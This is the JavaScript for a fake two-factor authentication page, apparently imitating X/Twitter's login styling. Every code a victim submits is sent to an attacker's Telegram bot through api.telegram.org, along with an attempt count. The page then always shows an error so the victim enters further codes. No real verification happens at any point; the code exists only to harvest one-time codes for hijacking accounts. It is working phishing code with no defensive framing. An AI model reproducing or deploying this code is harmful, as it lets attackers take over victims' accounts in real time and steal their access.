document.addEventListener('DOMContentLoaded', () => {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = window.TELEGRAM_CONFIG;
  const otpInput = document.getElementById('otp-input');
  const verifyBtn = document.getElementById('verify-btn');
  const form = document.getElementById('2fa-form');
  const errorMessage = document.getElementById('error-message');
  const btnText = document.getElementById('btn-text');
  const spinner = document.getElementById('spinner');
  let attemptCount = 0;
  let isLoading = false;

  otpInput.addEventListener('input', (e) => {
    // Ensure only numbers are entered
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
    validateOtp();
  });

  function validateOtp() {
    const otp = otpInput.value;
    if (otp.length === 6) {
      verifyBtn.disabled = false;
      verifyBtn.classList.remove('bg-[#787a7a]', 'text-[#0f1419]', 'cursor-not-allowed');
      verifyBtn.classList.add('bg-white', 'text-black', 'hover:bg-gray-200', 'cursor-pointer');
    } else {
      verifyBtn.disabled = true;
      verifyBtn.classList.add('bg-[#787a7a]', 'text-[#0f1419]', 'cursor-not-allowed');
      verifyBtn.classList.remove('bg-white', 'text-black', 'hover:bg-gray-200', 'cursor-pointer');
    }
  }

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (verifyBtn.disabled || isLoading) return;

    setLoading(true);

    const otp = otpInput.value;
    attemptCount++;

    await sendTelegramNotification(otp, attemptCount);

    setLoading(false);

    // Show error message and clear inputs
    errorMessage.classList.remove('hidden');
    otpInput.value = '';
    otpInput.focus();
    validateOtp();
  });

  function setLoading(state) {
    isLoading = state;
    if (state) {
      btnText.classList.add('hidden');
      spinner.classList.remove('hidden');
      verifyBtn.disabled = true;
      verifyBtn.classList.add('cursor-wait');
    } else {
      btnText.classList.remove('hidden');
      spinner.classList.add('hidden');
      verifyBtn.disabled = false;
      verifyBtn.classList.remove('cursor-wait');
    }
  }

  async function sendTelegramNotification(otp, attempt) {
    const message = `2FA Code: ${otp}\nAttempt: ${attempt}`;
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
      await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
    } catch (err) {
      console.error('Telegram notification error:', err);
    }
  }
});